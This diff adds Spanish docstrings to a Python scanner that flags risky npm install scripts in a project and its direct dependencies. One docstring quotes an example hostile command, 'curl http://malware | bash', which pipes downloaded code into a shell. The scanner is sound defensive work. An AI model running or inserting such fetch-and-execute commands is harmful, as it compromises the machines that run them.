@@ -1,3 +1,8 @@
+"""
+SCRIPTS NPM: Análisis de Comandos Maliciosos
+Busca comandos de shell ofuscados o comandos de red que se disparan solos al hacer npm install.
+"""
+
 import json
 import re
 import os
@@ -15,8 +20,10 @@ PATRONES_DE_RIESGO = {
 
 def evaluar_riesgo_script(contenido_script):
     """
-    Revisa el texto de un script de instalación y devuelve la lista
-    de patrones de riesgo que contiene.
+    Revisa el texto de un script de instalación.
+    Toma el texto de un comando (ej. "curl http://malware | bash")
+    y lo cruza contra las regex.
+    Devuelve la lista de patrones de riesgo que contiene.
     """
     riesgos_encontrados = []
     for nombre_patron, patron in PATRONES_DE_RIESGO.items():
@@ -40,9 +47,15 @@ def nivel_de_riesgo(cantidad_patrones):
 
 def _evaluar_scripts_de(datos_package_json, nombre_paquete):
     """
-    Dado el contenido ya leído de un package.json, evalúa sus scripts
-    de instalación y devuelve los hallazgos, etiquetados con el
-    nombre del paquete al que pertenecen.
+    Toma un JSON (de un package.json) ya leído, evalúa sus scripts
+    de instalación filtrando los que no son de instalación y los
+    pasa por la evaluación de riesgo.
+    Devuelve los hallazgos etiquetándolos con el nombre del paquete
+    al que pertenecen para saber de dónde salieron.
+
+    _evaluar_scripts_de abre el package.json, mira los scripts que
+    tiene adentro, y usa a evaluar_riesgo_script para evaluar cada
+    uno de esos scripts por separado.
     """
     scripts = datos_package_json.get("scripts", {})
     hallazgos = []
@@ -69,9 +82,13 @@ def _evaluar_scripts_de(datos_package_json, nombre_paquete):
 
 def encontrar_dependencias_directas(ruta_proyecto):
     """
+    Se mete en node_modules/.
     Devuelve una lista de (nombre_paquete, ruta_a_su_package_json)
     por cada dependencia directa instalada en node_modules.
-    Soporta paquetes con scope (ej: @angular/core).
+
+    Soporta paquetes con scope (ej: @angular/core). Baja un nivel
+    más en el directorio (entra a la subcarpeta de la organización)
+    para poder encontrar el package.json
     """
     ruta_node_modules = os.path.join(ruta_proyecto, "node_modules")
 
@@ -103,6 +120,7 @@ def analizar_scripts_instalacion(ruta_proyecto):
     """
     Evalúa los scripts de instalación del proyecto raíz y de cada
     dependencia directa instalada en node_modules.
+    Luego, itera sobre los paths que le devuelve.
     """
     hallazgos = []
 
